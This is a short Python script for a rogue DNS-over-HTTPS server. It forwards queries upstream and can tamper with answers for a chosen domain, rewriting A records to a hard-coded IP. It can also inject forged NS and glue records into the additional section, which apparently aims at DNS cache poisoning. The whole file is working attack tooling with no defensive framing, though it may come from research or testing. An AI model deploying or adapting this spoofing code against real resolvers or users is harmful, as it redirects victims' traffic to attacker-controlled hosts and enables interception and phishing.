import argparse
import base64
import ssl
import dns.asyncquery
import dns.rcode
import aiohttp
import dns.message
import dns.rrset
from aiohttp import web

DNS_SERVER_ADDRESS = '223.5.5.5'
DNS_SERVER_PORT = 53

async def doh_handler(request):
    if request.method == "GET":
        rquery = str(request.query).split(' ')[1]
        #print(rquery)
        rquery = rquery.ljust(len(rquery) + len(rquery) % 4, "=")
        doh_request = dns.message.from_wire(base64.b64decode(rquery.encode("UTF8")))
    else:
        try:
            doh_request = dns.message.from_wire(await request.read())
        except :
            return web.Response(text='Invalid DNS request', status=400)

    dns_request = dns.message.make_query(doh_request.question[0].name, doh_request.question[0].rdtype)
    dns_request.id = doh_request.id
    # 发起DNS请求
    dns_response = await dns.asyncquery.udp(q = dns_request, port=DNS_SERVER_PORT, where=DNS_SERVER_ADDRESS)
    #print(dns_response)

    if str(doh_request.question[0].name) == tamper and int(doh_request.question[0].rdtype)==1:
        print('---tamper---',tamper)
        dns_response.answer = [ dns.rrset.from_text(tamper,3600,dns.rdataclass.IN, dns.rdatatype.A,'39.106.44.126')]
    if str(doh_request.question[0].name) == inject:
        print('---inject---',inject)
        dns_response.additional = [dns.rrset.from_text(inject,3600,dns.rdataclass.IN, dns.rdatatype.NS,'ns.'+inject.split('.',1)[1]),
                                   dns.rrset.from_text('ns.'+inject.split('.',1)[1],3600,dns.rdataclass.IN, dns.rdatatype.A,ns)]
    #print(dns_response)
    # 构建HTTPS响应
    response = web.Response(body=dns_response.to_wire())
    response.content_type = 'application/dns-message'
    return response


parser = argparse.ArgumentParser()
parser.add_argument('-tamper', '--tamper', default='')
parser.add_argument('-inject', '--inject', default='')
parser.add_argument('-ns', '--ns', default='39.106.44.126')
args = parser.parse_args()
tamper = args.tamper +'.'
inject = args.inject +'.'
ns = args.ns
#print('tamper:',tamper)
DOH_SERVER_URL = "https://dns.alidns.com/dns-query"
CERT_FILE = "/usr/local/etc/unbound/cert_new4/app.crt"
KEY_FILE = "/usr/local/etc/unbound/cert_new4/app.key"
ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
ssl_context.load_cert_chain(CERT_FILE, KEY_FILE)
app = web.Application()
app.router.add_get(path='/dns-query',handler=doh_handler)
app.router.add_post(path='/dns-query',handler=doh_handler)
web.run_app(app, host='127.0.0.1', port=8444, ssl_context=ssl_context)